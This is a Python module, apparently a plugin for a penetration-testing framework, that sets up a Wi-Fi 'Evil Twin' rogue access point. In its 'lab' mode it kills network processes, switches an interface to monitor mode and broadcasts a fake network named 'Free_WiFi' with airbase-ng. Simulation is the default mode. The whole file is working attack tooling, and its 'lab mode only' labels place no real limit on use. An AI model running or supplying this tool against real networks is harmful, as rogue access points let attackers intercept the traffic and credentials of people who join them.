import subprocess
import logging
import os

# -------------------------------
# Configurable Defaults
# -------------------------------
DEFAULT_INTERFACE = "wlan0"
DEFAULT_SSID = "Free_WiFi"
DEFAULT_CHANNEL = "6"

# -------------------------------
# Core Execution (Lab Mode Only)
# -------------------------------
def create_evil_twin(interface, ssid, channel=DEFAULT_CHANNEL):
    """Create an Evil Twin network (lab mode only)."""
    try:
        logging.info("[*] Killing conflicting processes...")
        subprocess.call(["airmon-ng", "check", "kill"])

        logging.info(f"[*] Bringing down interface {interface}...")
        subprocess.call(["ifconfig", interface, "down"])

        logging.info(f"[*] Enabling monitor mode on {interface}...")
        subprocess.call(["airmon-ng", "start", interface])

        logging.info(f"[*] Launching fake AP: {ssid} (Channel {channel})...")
        subprocess.call(["airbase-ng", "-e", ssid, "-c", channel, interface])

        logging.info(f"[SUCCESS] Evil Twin network created: {ssid}")

    except Exception as e:
        logging.error(f"[ERROR] Failed to create Evil Twin network: {e}")

# -------------------------------
# Simulation Mode
# -------------------------------
def simulate_evil_twin(interface, ssid, channel=DEFAULT_CHANNEL):
    """Simulate Evil Twin creation safely."""
    logging.info("[SIMULATION] Evil Twin would be created with:")
    logging.info(f"Interface: {interface}")
    logging.info(f"SSID: {ssid}")
    logging.info(f"Channel: {channel}")

    print("\n--- SIMULATED EVIL TWIN ---")
    print(f"Interface: {interface}")
    print(f"SSID: {ssid}")
    print(f"Channel: {channel}")
    print("----------------------------\n")

# -------------------------------
# Dependency Check
# -------------------------------
def check_dependencies():
    """Check if required tools are installed."""
    required_tools = ["airmon-ng", "airbase-ng", "ifconfig"]
    missing = []

    for tool in required_tools:
        if not shutil_which(tool):
            missing.append(tool)

    return missing

def shutil_which(cmd):
    """Lightweight shutil.which replacement (no import overhead)."""
    for path in os.environ.get("PATH", "").split(os.pathsep):
        full_path = os.path.join(path, cmd)
        if os.path.exists(full_path) and os.access(full_path, os.X_OK):
            return full_path
    return None

# -------------------------------
# Required Framework Entry Point
# -------------------------------
def run(config):
    """
    Framework entry point.
    Expects:
        config = {
            "target": optional (not used here),
            "mode": "simulation" | "lab",
            "interface": "...",
            "ssid": "...",
            "channel": "..."
        }
    """
    mode = config.get("mode", "simulation")
    interface = config.get("interface", DEFAULT_INTERFACE)
    ssid = config.get("ssid", DEFAULT_SSID)
    channel = config.get("channel", DEFAULT_CHANNEL)

    logging.info(f"Evil Twin module started | Mode: {mode}")

    if mode == "simulation":
        simulate_evil_twin(interface, ssid, channel)

    elif mode == "lab":
        missing = check_dependencies()
        if missing:
            logging.error(f"Missing required tools: {missing}")
            print(f"[!] Missing tools: {', '.join(missing)}")
            return

        create_evil_twin(interface, ssid, channel)

    else:
        logging.warning(f"Unknown mode: {mode}")
        print(f"[!] Unknown mode: {mode}")

# -------------------------------
# Optional Direct Run (Testing)
# -------------------------------
if __name__ == "__main__":
    test_config = {
        "mode": "simulation",
        "interface": "wlan0",
        "ssid": "Test_WiFi",
        "channel": "6"
    }
    run(test_config)
